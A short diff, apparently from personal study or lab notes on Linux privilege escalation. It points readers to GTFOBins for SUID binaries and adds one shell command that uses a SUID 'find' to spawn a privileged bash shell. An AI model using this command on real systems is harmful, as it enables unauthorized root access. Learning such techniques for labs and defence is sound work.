@@ -216,7 +216,5 @@ SUID SET TO A BINARY CAN BE USED FOR PRIVESK
 GOTO GTFOBINS AND FIND THE BINARY AND YOU WILL GET THE COMMAND 
 
 ```SHELL
-find /
+find /home/joe/desktop -exec "/usr/bin/bash" -p \;
 ```
-
-    
